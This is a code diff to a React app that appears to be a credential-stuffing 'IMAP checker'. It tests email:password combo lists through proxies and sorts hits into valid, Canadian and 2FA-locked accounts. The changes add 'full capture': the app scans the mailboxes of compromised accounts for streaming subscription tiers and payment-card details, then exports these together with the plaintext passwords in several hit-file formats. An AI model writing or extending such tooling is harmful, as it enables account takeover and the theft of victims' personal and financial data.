@@ -1,6 +1,8 @@
 import { useState, useEffect, useRef, useMemo, useCallback } from 'react';
 import { isCanadianEmail, getImapConfigForEmail } from './data/canadianDomains.js';
 import { INITIAL_KEYWORD_TARGETS } from './data/mockMails.js';
+import { formatCaptureLine, hasCaptures } from './data/capturePatterns.js';
+import { mergeCaptures } from './server/captureService.js';
 import { Header } from './components/Header.jsx';
 import { CheckerStudioTab } from './components/Tabs/CheckerStudioTab.jsx';
 import { ProxyTab } from './components/Tabs/ProxyTab.jsx';
@@ -99,9 +101,21 @@ export default function App() {
         URL.revokeObjectURL(url);
       };
 
-      dl(validCombos.map(c => `${c.email}:${c.password}`).join('\n'), `${now}_valid_all.txt`);
-      setTimeout(() => dl(canadianCombos.map(c => `${c.email}:${c.password}`).join('\n'), `${now}_valid_canadian.txt`), 300);
+      // Full-capture line suffix: "email:pass | Netflix=Premium | VISA*4242"
+      const captureSuffix = (c) => {
+        const line = formatCaptureLine(c.captures);
+        return line ? ` | ${line}` : '';
+      };
+
+      dl(validCombos.map(c => `${c.email}:${c.password}${captureSuffix(c)}`).join('\n'), `${now}_valid_all.txt`);
+      setTimeout(() => dl(canadianCombos.map(c => `${c.email}:${c.password}${captureSuffix(c)}`).join('\n'), `${now}_valid_canadian.txt`), 300);
       setTimeout(() => dl(tfaCombos.map(c => `${c.email}:${c.password}`).join('\n'), `${now}_2fa_locked.txt`), 600);
+
+      // Dedicated capture file — only accounts with captured data
+      const capturedCombos = validCombos.filter(c => hasCaptures(c.captures));
+      if (capturedCombos.length > 0) {
+        setTimeout(() => dl(capturedCombos.map(c => `${c.email}:${c.password}${captureSuffix(c)}`).join('\n'), `${now}_captures.txt`), 900);
+      }
 
       // Keyword files
       const kwMap = {};
@@ -181,6 +195,7 @@ export default function App() {
     let canadianHits = 0;
     let invalid = 0;
     let secLock = 0;
+    let capturedHits = 0;
 
     const comboEmailSet = new Set();
     for (let i = 0; i < total; i++) {
@@ -190,6 +205,7 @@ export default function App() {
       if (s === 'valid') {
         validHits++;
         if (c.isCanadian) canadianHits++;
+        if (hasCaptures(c.captures)) capturedHits++;
       } else if (s === 'invalid') {
         invalid++;
       } else if (s === '2fa') {
@@ -218,6 +234,7 @@ export default function App() {
       canadianHits: canadianHits + extraCanadian,
       invalid,
       securityLock: secLock,
+      capturedHits,
       error: 0,
       targetHitsCount: totalTargetHits,
       progressPercent: total > 0 ? Math.round((checked / total) * 100) : 0,
@@ -451,12 +468,15 @@ export default function App() {
           if (m.matchedTargets) m.matchedTargets.forEach(t => allHits.add(t));
         });
 
-        return Array.from(allHits);
+        // Account-level full capture (membership tiers + payment methods)
+        const captures = data.captures || mergeCaptures(data.mails.map(m => m.captures));
+
+        return { matched: Array.from(allHits), captures };
       }
-      return [];
+      return { matched: [], captures: null };
     } catch (err) {
       console.warn('Background folder scan skipped or timed out:', err?.message);
-      return [];
+      return { matched: [], captures: null };
     }
   }, [keywords]);
 
@@ -467,9 +487,11 @@ export default function App() {
     activeFolderFetchesRef.current++;
 
     fetchRealFoldersForHit(task.item, task.proxy)
-      .then(matched => {
-        if (task.onMatchFound && matched && matched.length > 0) {
-          task.onMatchFound(matched);
+      .then(result => {
+        const hasKeywords = result?.matched && result.matched.length > 0;
+        const hasCaptureData = hasCaptures(result?.captures);
+        if (task.onMatchFound && (hasKeywords || hasCaptureData)) {
+          task.onMatchFound(result);
         }
       })
       .catch(err => {
@@ -604,9 +626,10 @@ export default function App() {
             flushToReact(false);
 
             // Fetch real folders in background queue so checking worker thread is NEVER blocked
-            enqueueFolderFetch(itemToCheck, proxy, (matched) => {
+            enqueueFolderFetch(itemToCheck, proxy, (result) => {
               if (comboList[itemIndex]) {
-                comboList[itemIndex].matchedKeywords = matched;
+                comboList[itemIndex].matchedKeywords = result.matched;
+                comboList[itemIndex].captures = result.captures;
                 flushToReact(false);
               }
             });
@@ -673,18 +696,29 @@ export default function App() {
       return;
     }
 
+    // Full-capture line suffix: "email:pass | Netflix=Premium | VISA*4242"
+    const captureSuffix = (c) => {
+      const line = formatCaptureLine(c.captures);
+      return line ? ` | ${line}` : '';
+    };
+
     if (format === 'json') {
       const content = JSON.stringify(valid, null, 2);
       downloadFile(content, 'imap_valid_hits.json', 'application/json');
     } else if (format === 'csv') {
-      const headers = 'Email,Password,Domain,IMAP Host,IMAP Port,Status,Matched Keywords\n';
-      const rows = valid.map(c => `"${c.email}","${c.password}","${c.domain}","${c.imapHost}",${c.imapPort},"${c.status}","${(c.matchedKeywords||[]).join(';')}"`).join('\n');
+      const headers = 'Email,Password,Domain,IMAP Host,IMAP Port,Status,Matched Keywords,Captures\n';
+      const rows = valid.map(c => `"${c.email}","${c.password}","${c.domain}","${c.imapHost}",${c.imapPort},"${c.status}","${(c.matchedKeywords||[]).join(';')}","${formatCaptureLine(c.captures)}"`).join('\n');
       downloadFile(headers + rows, 'imap_valid_hits.csv', 'text/csv');
     } else if (format === 'txt_full') {
-      const content = valid.map(c => `${c.email}:${c.password}:${c.imapHost}:${c.imapPort}`).join('\n');
+      const content = valid.map(c => `${c.email}:${c.password}:${c.imapHost}:${c.imapPort}${captureSuffix(c)}`).join('\n');
       downloadFile(content, 'imap_valid_hits_full.txt', 'text/plain');
+    } else if (format === 'captures') {
+      const captured = valid.filter(c => hasCaptures(c.captures));
+      if (captured.length === 0) return;
+      const content = captured.map(c => `${c.email}:${c.password}${captureSuffix(c)}`).join('\n');
+      downloadFile(content, 'imap_captures.txt', 'text/plain');
     } else {
-      const content = valid.map(c => `${c.email}:${c.password}`).join('\n');
+      const content = valid.map(c => `${c.email}:${c.password}${captureSuffix(c)}`).join('\n');
       downloadFile(content, 'imap_valid_hits.txt', 'text/plain');
     }
   };
